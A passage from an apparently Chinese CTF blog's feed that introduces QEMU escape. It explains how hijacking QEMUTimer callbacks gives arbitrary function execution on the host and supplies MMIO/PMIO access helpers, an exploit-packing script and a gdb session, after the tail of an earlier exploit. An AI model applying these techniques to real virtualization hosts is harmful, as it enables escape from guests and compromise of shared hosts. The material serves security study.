class="number">0</span>);</span><br><span class="line">    Qanux247(<span class="number">0</span>);</span><br><span class="line">    Qanux248(<span class="number">248</span>);</span><br><span class="line">    Qanux249(<span class="number">249</span>);</span><br><span class="line">    Qanux250(<span class="number">250</span>);</span><br><span class="line">    Qanux251(<span class="number">251</span>);</span><br><span class="line">    Qanux252(<span class="number">252</span>);</span><br><span class="line">    Qanux253(<span class="number">253</span>);</span><br><span class="line">    Qanux254(<span class="number">254</span>);</span><br><span class="line">    Qanux255(<span class="number">255</span>);</span><br><span class="line">    Qanux240(<span class="number">666</span>);</span><br><span class="line">    Qanux241(<span class="number">666</span>);</span><br><span class="line">    Qanux242(<span class="number">666</span>);</span><br><span class="line">    Qanux243(<span class="number">666</span>);</span><br><span class="line">    Qanux244(<span class="number">666</span>);</span><br><span class="line">    Qanux245(<span class="number">666</span>);</span><br><span class="line">    Qanux246(<span class="number">666</span>);</span><br><span class="line">    Qanux247(<span class="number">666</span>);</span><br><span class="line">    fight(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://zhuanlan.zhihu.com/p/122522485?utm_id=0">https://zhuanlan.zhihu.com/p/122522485?utm_id=0</a><br><a href="https://bbs.kanxue.com/thread-273119.htm#msg_header_h1_0">https://bbs.kanxue.com/thread-273119.htm#msg_header_h1_0</a><br><a href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_6">https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_6</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初探qemu逃逸</title>
      <link href="/2024/02/19/qemu%E9%80%83%E9%80%B8/"/>
      <url>/2024/02/19/qemu%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p>最近找时间入门了一下<code>qemu</code>逃逸，发现挺有意思的。感觉其实和用户态的<code>pwn</code>差不多，目标是通过分析<code>qemu-system</code>这个<code>elf</code>中的漏洞使其执行自己想要的函数。在该<code>elf</code>中执行的操作可以访问到<code>qemu</code>外，所以造成了逃逸<br>这里主要用于记录平时<code>qemu</code>逃逸学习时常用的脚本以及入门时做的几道有代表性的题目</p><h1 id="一些可以利用的点"><a href="#一些可以利用的点" class="headerlink" title="一些可以利用的点"></a>一些可以利用的点</h1><p>在<code>qemu</code>的<code>elf</code>中存在一个名为<code>main_loop_tlg</code>的数组，该数组用于存储<code>QEMUTimerList</code>结构体指针</p><h4 id="一些重要结构体"><a href="#一些重要结构体" class="headerlink" title="一些重要结构体"></a>一些重要结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** MemoryRegion:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A struct representing a memory region.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> ram;</span><br><span class="line">    <span class="type">bool</span> subpage;</span><br><span class="line">    <span class="type">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> rom_device;</span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="type">bool</span> global_locking;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    MemoryRegion *container;</span><br><span class="line">    Int128 size;</span><br><span class="line">    hwaddr addr;</span><br><span class="line">    <span class="type">void</span> (*destructor)(MemoryRegion *mr);</span><br><span class="line">    <span class="type">uint64_t</span> align;</span><br><span class="line">    <span class="type">bool</span> terminates;</span><br><span class="line">    <span class="type">bool</span> ram_device;</span><br><span class="line">    <span class="type">bool</span> enabled;</span><br><span class="line">    <span class="type">bool</span> warning_printed; <span class="comment">/* For reservations */</span></span><br><span class="line">    <span class="type">uint8_t</span> vga_logging_count;</span><br><span class="line">    MemoryRegion *alias;</span><br><span class="line">    hwaddr alias_offset;</span><br><span class="line">    <span class="type">int32_t</span> priority;</span><br><span class="line">    QTAILQ_HEAD(, MemoryRegion) subregions;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;</span><br><span class="line">    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">unsigned</span> ioeventfd_nb;</span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    <span class="type">int</span> scale;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerList</span> &#123;</span></span><br><span class="line">    QEMUClock *clock;</span><br><span class="line">    QemuMutex active_timers_lock;</span><br><span class="line">    QEMUTimer *active_timers;  <span class="comment">// 0x40</span></span><br><span class="line">    QLIST_ENTRY(QEMUTimerList) <span class="built_in">list</span>;</span><br><span class="line">    QEMUTimerListNotifyCB *notify_cb;</span><br><span class="line">    <span class="type">void</span> *notify_opaque;</span><br><span class="line">    QemuEvent timers_done_ev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>下面借用<code>sky123</code>师傅的一张图片</p><img src="/2024/02/19/qemu%E9%80%83%E9%80%B8/1.png" class="" title="我的图图呢">  <p>我们可以将<code>QEMUTimer</code>结构体中的<code>expire_time</code>修改为非负数，<code>cb</code>指针指向我们想要执行的函数的地址，<code>opaque</code>指向存放参数的地址，我们即可实现任意函数执行。从图片中我们还可以发现，<code>active_timers</code>指针是指向<code>QEMUTimer</code>结构体的，我们可以通过修改该指针指向我们伪造的<code>QEMUTimer</code>结构体，也可以实现相同的效果。<br>其实<code>qemu</code>逃逸本质上和<code>user</code>态的<code>pwn</code>没有什么区别，所以在<code>glibc</code>中的各种<code>house of</code>手法在这里也是可以使用的，<code>ACTF 2022</code>就出现了一题<code>qemu</code>逃逸要打<code>fsop</code>，所以我们要放宽我们的思维。</p><h1 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h1><p>还得是<code>eeee</code>和<code>sky123</code>师傅，脚本通俗易懂他们的文章给我学习<code>qemu</code>逃逸提供了很大的帮助</p><h2 id="qemu中访问PCI设备的mmio空间"><a href="#qemu中访问PCI设备的mmio空间" class="headerlink" title="qemu中访问PCI设备的mmio空间"></a>qemu中访问PCI设备的mmio空间</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">size_t</span> offset, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *) (mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">size_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span> *) (mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_init</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mlock(mmio_mem, <span class="number">0x1000</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mlock mmio_mem.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="qemu中访问PCI设备的PMIO空间"><a href="#qemu中访问PCI设备的PMIO空间" class="headerlink" title="qemu中访问PCI设备的PMIO空间"></a>qemu中访问PCI设备的PMIO空间</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pmio_base = <span class="number">0xc040</span>;</span><br><span class="line"><span class="comment">// cat /sys/devices/pci0000:00/0000:00:04.0/resource</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span>&#123;</span><br><span class="line">    outl(value, pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="辅助脚本"><a href="#辅助脚本" class="headerlink" title="辅助脚本"></a>辅助脚本</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="打包脚本"><a href="#打包脚本" class="headerlink" title="打包脚本"></a>打包脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mkdir ./rootfs</span><br><span class="line">cd ./rootfs</span><br><span class="line">cpio -idmv &lt; ../rootfs.cpio</span><br><span class="line"> </span><br><span class="line">cp ../exp.c ./root</span><br><span class="line">gcc -o ./root/exp -static ./root/exp.c</span><br><span class="line"> </span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class="line"> </span><br><span class="line">cd ..</span><br><span class="line">rm -rf ./rootfs</span><br></pre></td></tr></table></figure><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><ul><li>启动<code>qemu</code></li><li>获取进程号</li><li><code>gdb</code>内连接</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop/qemu$ ps -aux | grep qemu</span><br><span class="line">or4nge     977  4.3  0.8 375628 138068 pts/0   Sl+  14:43   0:10 ./qemu-system-x86_64 -initrd ./initramfs.cpio -kernel ./vmlinuz-4.8.0-52-generic -append console=ttyS0 root=/dev/ram oops=panic panic=1 -monitor /dev/null -m 64M --nographic -L pc-bios -device rfid,id=vda</span><br><span class="line">or4nge    1020  0.0  0.0   4024  2020 pts/1    S+   14:47   0:00 grep --color=auto qemu</span><br><span class="line">or4nge@圈圈:/mnt/d/desktop/qemu$ gdb qemu-system-x86_64</span><br><span class="line">GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1</span><br><span class="line">Copyright (C) 2022 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">attach pwndbg: loaded 154 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)</span><br><span class="line">Reading symbols from qemu-system-x86_64...</span><br><span class="line">(No debugging symbols found in qemu-system-x86_64)</span><br><span class="line">------- tip of the day (disable with set show-tips off) -------</span><br><span class="line">Use patch &lt;address&gt; &#x27;&lt;assembly&gt;&#x27; to patch an address with given assembly code</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">attach 977</span></span><br><span class="line">Attaching to program: /mnt/d/desktop/qemu/qemu-system-x86_64, process 977</span><br><span class="line">[New LWP 978]</span><br><span class="line">[New LWP 979]</span><br><span class="line">[New LWP 980]</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">0x00007fda04c8bcce in __ppoll (fds=0x5617d5f1f240, nfds=5, timeout=&lt;optimized out&gt;, sigmask=0x0) at ../sysdeps/unix/sysv/linux/ppoll.c:42</span><br><span class="line">42      ../sysdeps/unix/sysv/linux/ppoll.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────</span><br><span class="line">*RAX  0xfffffffffffffdfe</span><br><span class="line">*RBX  0x5617d522b7d0 —▸ 0x5617d50688c0 —▸ 0x5617d5012350 —▸ 0x5617d50124d0 ◂— &#x27;fw_cfg_io&#x27;</span><br><span class="line">*RCX  0x7fda04c8bcce (ppoll+174) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */</span><br><span class="line">*RDX  0x7fff06549b90 ◂— 0x0</span><br><span class="line">*RDI  0x5617d5f1f240 ◂— 0x100000000</span><br><span class="line">*RSI  0x5</span><br><span class="line">*R8   0x8</span><br><span class="line">*R9   0x0</span><br><span class="line">*R10  0x0</span><br><span class="line">*R11  0x293</span><br><span class="line">*R12  0x7fff06549fd8 —▸ 0x7fff0654a285 ◂— &#x27;./qemu-system-x86_64&#x27;</span><br><span class="line">*R13  0x7fff06549b90 ◂— 0x0</span><br><span class="line">*R14  0x0</span><br><span class="line">*R15  0x7fda050f9040 (_rtld_global) —▸ 0x7fda050fa2e0 —▸ 0x5617d3600000 ◂— jg 0x5617d3600047</span><br><span class="line">*RBP  0x7fff06549c10 —▸ 0x7fff06549c40 —▸ 0x7fff06549c90 —▸ 0x7fff06549ca0 —▸ 0x7fff06549ec0 ◂— ...</span><br><span class="line">*RSP  0x7fff06549b70 ◂— 0x0</span><br><span class="line">*RIP  0x7fda04c8bcce (ppoll+174) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */</span><br><span class="line">──────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────</span><br><span class="line"> ► 0x7fda04c8bcce &lt;ppoll+174&gt;    cmp    rax, -0x1000</span><br><span class="line">   0x7fda04c8bcd4 &lt;ppoll+180&gt;    ja     ppoll+240                &lt;ppoll+240&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7fda04c8bd10 &lt;ppoll+240&gt;    mov    rdx, qword ptr [rip + 0x1010f9]</span><br><span class="line">   0x7fda04c8bd17 &lt;ppoll+247&gt;    neg    eax</span><br><span class="line">   0x7fda04c8bd19 &lt;ppoll+249&gt;    mov    dword ptr fs:[rdx], eax</span><br><span class="line">   0x7fda04c8bd1c &lt;ppoll+252&gt;    mov    eax, 0xffffffff</span><br><span class="line">   0x7fda04c8bd21 &lt;ppoll+257&gt;    jmp    